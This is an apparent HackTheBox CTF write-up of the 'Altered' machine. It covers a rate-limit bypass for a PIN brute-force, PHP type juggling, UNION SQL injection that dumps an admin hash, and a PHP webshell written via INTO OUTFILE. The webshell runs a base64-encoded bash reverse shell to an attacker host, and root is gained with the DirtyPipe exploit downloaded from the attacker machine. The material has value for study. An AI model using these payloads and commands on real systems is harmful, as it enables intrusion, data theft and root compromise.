# HTB Altered — Full Writeup

## Box Info

| Field | Value |
|---|---|
| Platform | HackTheBox |
| Event | UHC March Finals |
| OS | Linux |
| Kernel | 5.16.0 |
| Stack | Laravel / PHP-FPM / Nginx / MySQL |
| Difficulty | Hard |

## Attack Flow

Enumerate → Brute-force PIN (rate limit bypass) → Login as admin → Type juggling bypass → UNION SQLi → Write PHP reverse shell via INTO OUTFILE → Foothold → DirtyPipe privesc (CVE-2022-0847)

## Reconnaissance

The application is a Laravel-based web app with an API layer. Key endpoints discovered:

- `/api/resettoken` — password reset, requires a 4-digit PIN
- `/api/getprofile` — user profile retrieval, accepts JSON with `id` and `secret` parameters
- Rate limiting enforced per IP on API endpoints

## Phase 1: PIN Brute-Force with Rate Limit Bypass

### The Problem

The password reset endpoint `/api/resettoken` requires a 4-digit PIN (1000–9999) and enforces IP-based rate limiting (HTTP 429 after too many requests from the same IP).

### The Bypass

The application trusts the `X-Forwarded-For` header to identify the client IP. By rotating this header value with each request, the rate limit resets on every attempt.

### Tooling: wfuzz in Zip Mode

wfuzz's zip mode pairs entries from multiple wordlists one-to-one, which means both lists must be the same length. The PIN range has 9000 entries (1000–9999) but the IP octet range only has 254 (1–254). The fix is a cycling IP wordlist that repeats 1–254 until it exceeds the PIN count:

```bash
count=0
while [ $(wc -l < numbers) -le 10000 ]; do
  for i in $(seq 1 254); do
    echo $i
    ((count++))
  done
done >> numbers
```

### The Command

```bash
sudo wfuzz -H 'Cookie: <FRESH_SESSION_COOKIES>' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -u http://<TARGET>/api/resettoken \
  -d 'name=admin&pin=FUZZ' \
  -z range,1000-9999 -m zip -w numbers \
  -H 'X-Forwarded-For: 127.0.0.FUZ2Z' \
  --hh 5650
```

`FUZZ` is the PIN, `FUZ2Z` is the cycling IP octet. `--hh 5650` filters out invalid responses by character count.

### Mistakes Made

- Running wfuzz without session cookies: every response was identical ("Invalid"), making filtering impossible. The app requires a valid Laravel session to process the reset.
- Thinking `--random-agent` helps with rate limiting. It only randomizes the User-Agent header, not X-Forwarded-For.

### Result

PIN found: **1926**

## Phase 2: Type Juggling Bypass

### The Vulnerability

The `/api/getprofile` endpoint validates a `secret` parameter using PHP's loose comparison operator (`==`). In PHP:

```php
if ($request->secret == $storedSecret) { ... }
```

PHP's loose comparison has a well-known quirk: any non-empty string compared to boolean `true` evaluates to `true`:

```php
"s3cr3t_str1ng" == true  // true (loose)
"s3cr3t_str1ng" === true // false (strict)
```

### The Exploit

Send the `secret` field as a JSON boolean `true` instead of a string:

```json
{"id": "1", "secret": true}
```

This must be sent as `Content-Type: application/json`. Sending `"secret": "true"` (a string) does not work and returns "Tampered user input detected."

### Mitigation

Use strict comparison (`===`) instead of loose comparison (`==`). This is a one-character fix that eliminates the entire vulnerability class.

## Phase 3: UNION-Based SQL Injection

With the type juggling bypass in place, the `id` parameter in `/api/getprofile` is injectable. The query returns 3 columns.

### Step 1: Enumerate the Database

```json
{
  "id": "100 UNION SELECT 1,2,group_concat(concat('\\n', table_name, ':', column_name)) FROM information_schema.columns WHERE table_schema = 'uhc';-- -",
  "secret": true
}
```

This reveals the `users` table with columns including `name` and `password`.

### Step 2: Dump Credentials

```json
{
  "id": "100 UNION SELECT 1,2,group_concat(concat('\\n',name,':',password)) FROM users;-- -",
  "secret": true
}
```

Result: `admin:$2y$10$svpKAkLjRrLtfsm8t/T.tOPpbDoRcAjLtNhrQ.gbDd/wAO6Wc6YEu` (bcrypt)

### Alternative: sqlmap with Rate Limit Bypass

```bash
SQLMAP_UNSAFE_EVAL=1 sqlmap -r request --batch --random-agent \
  --eval="import random; headers={'X-Forwarded-For': '10.0.'+str(random.randint(0,255))+'.'+str(random.randint(1,254))}"
```

The `SQLMAP_UNSAFE_EVAL=1` environment variable is required for `--eval` to execute Python code. Without it, sqlmap exits with an error.

## Phase 4: Reverse Shell via INTO OUTFILE

MySQL's `INTO OUTFILE` writes query output to a file on disk. If MySQL has write permissions to the web root, this can drop a PHP webshell.

### Generate the Payload

Base64-encode the reverse shell to avoid special character issues inside the SQL string. The `-n` flag prevents a trailing newline that would break the encoding:

```bash
echo -n "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'" | base64
```

### Write the Shell

```json
{
  "id": "100 UNION SELECT 1,2,'<?php system(base64_decode(\"<BASE64_PAYLOAD>\")); ?>' INTO OUTFILE '/srv/altered/public/shell.php';-- -",
  "secret": true
}
```

### Trigger

```bash
# Terminal 1: start listener
nc -lvnp 4444

# Terminal 2: trigger the shell
curl http://<TARGET>/shell.php
```

### Critical Gotcha: PHP-FPM/OPcache

On this box, PHP-FPM only executes the first PHP file ever written to the web root via INTO OUTFILE. Any subsequent `.php` files are served as static downloads by Nginx instead of being passed to PHP-FPM for execution.

This means:
- Do NOT write a test file like `phpinfo.php` first
- The reverse shell must be the first and only PHP file written
- If you've already written any PHP file, reset the box and start over

### Other Issues Encountered

- `INTO OUTFILE` cannot overwrite existing files. MySQL throws an error if the file already exists. Each attempt needs a unique filename.
- Port 4444 may be blocked by outbound firewall rules. If the shell executes (504 Gateway Timeout instead of download) but no connection comes back, try port 443.

## Phase 5: Privilege Escalation — CVE-2022-0847 (DirtyPipe)

### The Vulnerability

The box runs kernel **5.16.0**, which is vulnerable to CVE-2022-0847, dubbed "DirtyPipe." This affects Linux kernels 5.8 through 5.16.11 (and 5.15.25, 5.10.102 in their respective branches). It was patched in 5.16.11, 5.15.25, and 5.10.102.

The bug is in how the kernel handles **pipe buffers** combined with the `splice()` system call. Here's the mechanism:

1. Linux pipes use an internal ring of page buffers. When you write data into a pipe, the kernel allocates a page and sets a flag called `PIPE_BUF_FLAG_CAN_MERGE` on that buffer, meaning "future writes can append into this same page without allocating a new one."

2. The `splice()` system call is designed to efficiently move data from a file into a pipe without copying it through userspace. It does this by inserting a **reference to the file's page cache** directly into the pipe's buffer ring. The page cache is the kernel's in-memory copy of file contents.

3. The bug: when `splice()` inserts a file's page cache entry into the pipe, it **fails to clear** the `PIPE_BUF_FLAG_CAN_MERGE` flag from a previous write. So the kernel still thinks it can append data into that buffer — but that buffer now points to a page from the file's cache.

4. The next `write()` to the pipe doesn't allocate a new page. Instead, it writes directly into the file's cached page in memory, overwriting the file's contents. This bypasses all permission checks because the write goes to the pipe (which the user owns), but the data lands in the file's page cache (which could be read-only, SUID, or owned by root).

5. The overwritten page cache is what the kernel serves to anyone reading that file, so the change is immediately visible system-wide. It persists until the page is evicted from cache or the system reboots (it doesn't modify the on-disk data directly).

### Why It Matters Here

The www-data user has zero write access to any privileged file. But with DirtyPipe, we can overwrite the contents of any file we can **read** — and on Linux, `/usr/bin/pkexec` (a SUID root binary) is readable by everyone. The exploit overwrites pkexec with a small payload that drops a SUID shell at `/tmp/sh`, then restores the original binary.

### Exploit Used

AlexisAhmed's `exploit-2.c` — this variant targets SUID binaries directly, avoiding the need for `su` (which on this box has a PAM-Wordle module that blocks password-less login).

### Steps

1. Stabilize the shell:
```bash
script /dev/null -c bash
# Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
```

2. Compile the exploit **on your Kali** with static linking (the box has no compiler, and dynamic binaries fail due to glibc version mismatch):
```bash
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c
gcc exploit-2.c -o exploit -static
python3 -m http.server 4000
```

The `-static` flag bundles all library code into the binary so it doesn't depend on the target's glibc version.

3. Transfer and execute on the box:
```bash
wget http://<ATTACKER_IP>:4000/exploit -O /tmp/exploit
chmod +x /tmp/exploit
/tmp/exploit /usr/bin/pkexec
```

4. Output:
```
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell..
(dont forget to clean up /tmp/sh ;))
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data),117(mysql)
```

5. Grab flags and clean up:
```bash
cat /root/root.txt
cat /home/*/user.txt
rm /tmp/sh
```

### Gotchas Encountered

- **glibc mismatch:** Compiling on a modern Kali without `-static` produces a binary that requires GLIBC_2.33/2.34, which the box doesn't have. Always use `-static` when cross-compiling exploits for older targets.
- **No compiler on target:** The box has no `gcc` or `cc`, so compiling on the box isn't an option. Must compile on attacker machine.
- **PAM-Wordle on su:** The box has a custom PAM module that turns `su` into a Wordle game. The exploit-2 variant avoids `su` entirely by hijacking a SUID binary directly.

### DirtyPipe Detection Checklist

When to check for DirtyPipe:
1. Run `uname -r` — vulnerable range is 5.8 to 5.16.10
2. Check if the kernel was patched (some distros backport fixes)
3. Look for writable directories to stage the exploit (`/tmp`, `/dev/shm`)
4. Identify SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
5. Check if the box has a compiler; if not, static-compile on your machine

## Methodology Notes

### Rate Limiting Bypass Checklist

When encountering rate limiting on a web app:
1. Check if `X-Forwarded-For` is trusted — rotate the header value
2. Check if `X-Real-IP`, `X-Originating-IP`, or `X-Client-IP` are trusted
3. Check if the rate limit is per-session, per-IP, or per-endpoint
4. Check if different HTTP verbs bypass the limit

### PHP Type Juggling Indicators

Look for type juggling when:
- The app uses PHP/Laravel
- A "secret" or "token" parameter is validated
- Changing the data type of a value (string → boolean → integer) produces different behavior
- Error messages mention "tampered input" when types don't match expectations

Always test: send `true` (boolean), `0` (integer), `""` (empty string), and `[]` (empty array) as alternatives to string values.

### INTO OUTFILE Conditions

For INTO OUTFILE to work:
- MySQL user needs the `FILE` privilege
- `secure_file_priv` must be empty or include the target directory
- MySQL process needs filesystem write permission to the target path
- The target file must not already exist
- The web server must be configured to execute PHP in that directory

### Key Lessons

1. Always include valid session cookies when brute-forcing authenticated endpoints
2. PHP type juggling is a one-character vulnerability (`==` vs `===`) with massive impact
3. INTO OUTFILE has a one-shot constraint on some PHP-FPM configurations — plan the payload before writing anything
4. When a reverse shell connects but doesn't call back, it's usually a port/firewall issue, not a payload issue
5. Base64 encoding payloads avoids escaping hell inside nested SQL/PHP/bash strings
